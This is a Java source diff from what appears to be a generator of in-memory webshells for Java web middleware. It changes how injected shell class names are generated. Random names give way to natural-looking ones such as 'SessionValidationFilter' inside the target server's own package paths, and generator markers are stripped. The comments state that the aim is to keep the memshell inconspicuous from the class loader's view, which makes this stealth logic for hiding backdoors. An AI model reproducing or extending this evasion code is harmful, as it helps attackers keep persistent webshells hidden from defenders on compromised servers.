@@ -1,10 +1,11 @@
 package com.reajason.javaweb.memshell.server;
 
 import com.reajason.javaweb.Server;
+import com.reajason.javaweb.memshell.ShellTypeSuffix;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
-import com.reajason.javaweb.utils.CommonUtil;
+import com.reajason.javaweb.utils.NameSampler;
 import com.reajason.javaweb.utils.StringUtils;
 import com.reajason.javaweb.utils.tuple.Pair;
 
@@ -85,14 +86,51 @@ public abstract class AbstractServer {
 
     /**
      * 生成内存马类名：类名会被放进与目标中间件同名的包下，让内存马在类加载器视角里不显突兀。
+     * <p>
+     * 结构为 {@code <中间件包名>.<包名段>.<前缀词><中段词><自然后缀>}，例如
+     * {@code org.apache.http.web.handlers.session.SessionValidationFilter}。
+     * 包名沿用各中间件自身常见的内部路径，让内存马在类加载器视角里不显突兀。
+     * 自然后缀由 {@link ShellTypeSuffix} 抹掉 {@code Jakarta}/{@code Agent} 等生成器内部标记。
      *
      * @param serverName 中间件名称，取值见 {@link com.reajason.javaweb.Server}
-     * @param shellType  内存马类型，作为类名后缀
+     * @param shellType  内存马类型，用于推导类名后缀
      */
     public static String generateShellClassName(String serverName, String shellType) {
+        NameSampler.SampledName name = NameSampler.sample(toClassNameSuffix(shellType));
         return getWebPackageName(serverName)
-                + "." + CommonUtil.getRandomString(5)
-                + "." + CommonUtil.getRandomMiddlewareName() + shellType;
+                + "." + name.getPackageSegment()
+                + "." + name.getSimpleName();
+    }
+
+    /**
+     * 把自定义 shellType 规范成采样器接受的 PascalCase 后缀。
+     * <p>
+     * {@link ShellTypeSuffix#of} 对未登记类型原样返回，但自定义类型可能是
+     * {@code my_filter} / {@code myFilter} 这类形式，直接交给 {@link NameSampler}
+     * 会因正则或长度限制失败。这里只影响类名的“自然后缀”，不影响注入逻辑。
+     */
+    static String toClassNameSuffix(String shellType) {
+        String suffix = ShellTypeSuffix.of(shellType);
+        if (NameSampler.isValidSuffix(suffix)) {
+            return suffix;
+        }
+        StringBuilder sanitized = new StringBuilder();
+        for (String part : suffix.split("[^A-Za-z0-9]+")) {
+            if (part.isEmpty()) {
+                continue;
+            }
+            sanitized.append(Character.toUpperCase(part.charAt(0)));
+            if (part.length() > 1) {
+                sanitized.append(part.substring(1));
+            }
+        }
+        if (sanitized.length() == 0) {
+            return "Handler";
+        }
+        if (!Character.isJavaIdentifierStart(sanitized.charAt(0))) {
+            sanitized.insert(0, "Custom");
+        }
+        return NameSampler.isValidSuffix(sanitized.toString()) ? sanitized.toString() : "Handler";
     }
 
     /**
